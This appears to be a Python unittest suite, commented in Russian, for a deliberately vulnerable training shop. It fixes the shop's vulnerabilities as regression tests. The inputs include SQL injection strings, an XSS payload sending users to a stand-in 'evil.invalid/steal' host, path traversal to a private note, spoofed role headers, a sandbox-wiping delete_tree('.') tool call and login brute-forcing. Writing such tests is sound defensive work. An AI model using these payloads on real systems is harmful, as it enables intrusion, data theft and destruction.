"""Security regression tests for the deliberately vulnerable Mini Shop.

Эти тесты фиксируют уязвимости, описанные в REPORT_01.md / plan.svg (модель угроз,
STRIDE T1..T11). На исходном уязвимом сервисе они ДОЛЖНЫ ПАДАТЬ — это ожидаемо и
является доказательством найденной уязвимости. После исправления service.py эти же
тесты должны начать проходить без изменения самих тестов.

Запуск: PYTHONDONTWRITEBYTECODE=1 python3 -m unittest test_security -v
"""

import html
import json
import threading
import unittest
from http.server import ThreadingHTTPServer
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from service import Shop, make_handler


class ShopSecurityTest(unittest.TestCase):
    """Прямые вызовы Shop.dispatch(), без реального HTTP-транспорта."""

    def setUp(self):
        self.shop = Shop()
        self.addCleanup(self.shop.close)

    def request(self, method, path, body=None, headers=None):
        with self.shop.lock:
            return self.shop.dispatch(method, path, body or {}, headers or {})

    def login(self, username="alice", password="learn-alice"):
        status, result = self.request("POST", "/login", {"username": username, "password": password})
        self.assertEqual(status, 200)
        return {"X-Token": result["token"]}

    # ---- T1: SQL-инъекция в /profile и /search ----------------------------

    def test_profile_id_is_not_vulnerable_to_sql_injection(self):
        """/profile?id= не должен позволять менять результат SQL через синтаксис id."""
        status, result = self.request("GET", "/profile?id=1 OR 1=1")
        # Безопасная реализация: либо ошибка валидации (400/404), либо ровно один
        # профиль ровно с id=1, но никогда — все профили сразу.
        if status == 200:
            self.assertEqual(len(result), 1, "SQL-инъекция вернула больше одной строки через id=1 OR 1=1")
        else:
            self.assertIn(status, (400, 404))

    def test_search_query_is_not_vulnerable_to_sql_injection(self):
        """/search?q= не должен позволять UNION-инъекцию для чтения таблицы orders."""
        status, result = self.request("GET", "/search?q=%' UNION SELECT id, product, price, 1 FROM orders --")
        if status == 200:
            names = {row["name"] for row in result}
            self.assertFalse(
                {"chair", "lamp"} & names,
                "UNION-инъекция протащила название товара из таблицы orders через /search",
            )
        else:
            self.assertIn(status, (400, 404))

    # ---- T2: авторизация /admin/export по клиентскому заголовку -----------

    def test_admin_export_requires_real_staff_session_not_client_header(self):
        """Клиент не должен получать доступ к экспорту, просто подставив X-Role: staff."""
        auth = self.login("alice", "learn-alice")  # обычный customer, не staff
        status, result = self.request("GET", "/admin/export", headers={**auth, "X-Role": "staff"})
        self.assertEqual(status, 403, "customer с X-Role: staff получил доступ к /admin/export")

    def test_admin_export_without_any_token_is_rejected(self):
        status, result = self.request("GET", "/admin/export", headers={"X-Role": "staff"})
        self.assertEqual(status, 403, "/admin/export доступен вообще без серверной сессии")

    # ---- T3: IDOR в GET /orders --------------------------------------------

    def test_get_orders_requires_authentication(self):
        status, result = self.request("GET", "/orders")
        self.assertEqual(status, 401, "GET /orders отдаёт заказы без авторизации вообще")

    def test_get_orders_returns_only_own_orders(self):
        auth = self.login("alice", "learn-alice")
        status, result = self.request("GET", "/orders", headers=auth)
        self.assertEqual(status, 200)
        owners = {row["owner"] for row in result}
        self.assertEqual(owners, {1}, "Alice видит чужие заказы (owner != 1) через GET /orders")

    # ---- T4: клиент назначает цену заказа ----------------------------------

    def test_customer_cannot_override_catalog_price(self):
        auth = self.login("alice", "learn-alice")
        status, order = self.request("POST", "/orders", {"product": "chair", "price": 1}, auth)
        self.assertEqual(status, 201)
        self.assertEqual(order["price"], 5000, "Сервер принял произвольную цену из тела запроса клиента")

    # ---- T5: IDOR при чтении файлов через /files ---------------------------

    def test_files_endpoint_requires_authentication(self):
        status, result = self.request("GET", "/files?user=alice&path=receipt.txt")
        self.assertEqual(status, 401, "/files отдаёт содержимое файла без авторизации")

    def test_files_endpoint_blocks_reading_other_users_receipt(self):
        auth = self.login("alice", "learn-alice")
        status, result = self.request("GET", "/files?user=bob&path=receipt.txt", headers=auth)
        self.assertNotEqual(status, 200, "Alice смогла прочитать чек Боба через /files?user=bob")

    def test_files_endpoint_blocks_private_operator_note(self):
        auth = self.login("alice", "learn-alice")
        status, result = self.request(
            "GET", "/files?user=alice&path=../../private/operator-note.txt", headers=auth
        )
        self.assertNotEqual(status, 200, "Удалось прочитать private/operator-note.txt через /files")

    # ---- T6: утечка токенов сессий через /debug/logs -----------------------

    def test_debug_logs_requires_staff_authentication(self):
        status, result = self.request("GET", "/debug/logs")
        self.assertEqual(status, 401, "/debug/logs доступен без какой-либо авторизации")

    def test_debug_logs_do_not_leak_session_tokens(self):
        auth = self.login("staff", "learn-staff")
        self.login("alice", "learn-alice")  # создаём токен Alice в логах
        status, result = self.request("GET", "/debug/logs", headers={**auth, "X-Role": "staff"})
        if status != 200:
            return  # эндпоинт закрыт вообще — угрозы нет
        for entry in result:
            headers = entry.get("headers", {})
            self.assertNotIn("X-Token", headers, "Журнал запросов хранит чужие X-Token в открытом виде")

    # ---- T7: хранимый XSS в отзывах -----------------------------------------

    def test_review_text_is_escaped_in_html_view(self):
        payload = "<script>document.location='https://evil.invalid/steal'</script>"
        self.request("POST", "/reviews", {"product": "chair", "text": payload})
        status, page = self.request("GET", "/reviews/view")
        self.assertEqual(status, 200)
        self.assertNotIn("<script>", page, "Текст отзыва вставлен в HTML без escape — хранимый XSS")
        self.assertIn(html.escape(payload), page)

    # ---- T9: /assistant/execute без авторизации и без owner-проверки ------

    def test_assistant_execute_requires_authentication(self):
        status, result = self.request(
            "POST", "/assistant/execute",
            {"decision": {"tool": "read_file", "arguments": {"path": "files/alice/receipt.txt"}}},
        )
        self.assertEqual(status, 401, "/assistant/execute выполняет решение без проверки X-Token")

    def test_assistant_execute_blocks_reading_private_note(self):
        auth = self.login("alice", "learn-alice")
        status, result = self.request(
            "POST", "/assistant/execute",
            {"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}},
            auth,
        )
        self.assertNotEqual(status, 200, "Клиент прочитал private/operator-note.txt через /assistant/execute")

    def test_assistant_execute_blocks_export_profiles_for_customer(self):
        auth = self.login("alice", "learn-alice")
        status, result = self.request(
            "POST", "/assistant/execute", {"decision": {"tool": "export_profiles", "arguments": {}}}, auth
        )
        self.assertNotEqual(status, 200, "Обычный клиент выполнил export_profiles через /assistant/execute")

    # ---- T10: delete_tree уничтожает всю песочницу --------------------------

    def test_assistant_execute_blocks_delete_tree_without_owner_check(self):
        auth = self.login("alice", "learn-alice")
        root = self.shop.sandbox.root
        status, result = self.request(
            "POST", "/assistant/execute", {"decision": {"tool": "delete_tree", "arguments": {"path": "."}}}, auth
        )
        self.assertNotEqual(status, 200, "Клиент удалил всю файловую песочницу через delete_tree('.')")
        self.assertTrue(root.exists(), "Песочница уничтожена безнаказанно одним клиентским запросом")

    # ---- T11: отсутствие rate-limit на /login --------------------------------

    def test_login_has_rate_limiting_after_many_failures(self):
        for _ in range(20):
            self.request("POST", "/login", {"username": "alice", "password": "wrong"})
        status, result = self.request("POST", "/login", {"username": "alice", "password": "wrong"})
        self.assertNotEqual(
            status, 401, "После 20+ неверных попыток логин не заблокирован (нет rate limiting / lockout)"
        )


class ShopSecurityHttpTest(unittest.TestCase):
    """Те же проверки через настоящий HTTP-транспорт (заголовки, статусы, JSON)."""

    @classmethod
    def setUpClass(cls):
        cls.shop = Shop()
        cls.server = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(cls.shop))
        cls.server.daemon_threads = True
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()
        cls.base = f"http://127.0.0.1:{cls.server.server_port}"

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.thread.join(timeout=5)
        cls.server.server_close()
        cls.shop.close()

    def call(self, method, path, body=None, headers=None):
        headers = {"Content-Type": "application/json", **(headers or {})}
        request = Request(
            self.base + path,
            data=json.dumps(body).encode() if body is not None else None,
            headers=headers,
            method=method,
        )
        try:
            response = urlopen(request, timeout=5)
        except HTTPError as exc:
            response = exc
        with response:
            return response.status, response.headers, response.read().decode()

    def login(self, username="alice", password="learn-alice"):
        status, _, body = self.call("POST", "/login", {"username": username, "password": password})
        self.assertEqual(status, 200)
        return {"X-Token": json.loads(body)["token"]}

    def test_http_admin_export_rejects_spoofed_role_header(self):
        auth = self.login("alice", "learn-alice")
        status, _, _ = self.call("GET", "/admin/export", headers={**auth, "X-Role": "staff"})
        self.assertEqual(status, 403, "HTTP: подделка X-Role: staff даёт доступ к экспорту профилей")

    def test_http_orders_list_requires_token(self):
        status, _, _ = self.call("GET", "/orders")
        self.assertEqual(status, 401, "HTTP: GET /orders отдаёт все заказы без X-Token")

    def test_http_files_endpoint_blocks_cross_user_access(self):
        auth = self.login("alice", "learn-alice")
        status, _, _ = self.call("GET", "/files?user=bob&path=receipt.txt", headers=auth)
        self.assertNotEqual(status, 200, "HTTP: Alice читает чек Боба через /files")


if __name__ == "__main__":
    unittest.main()
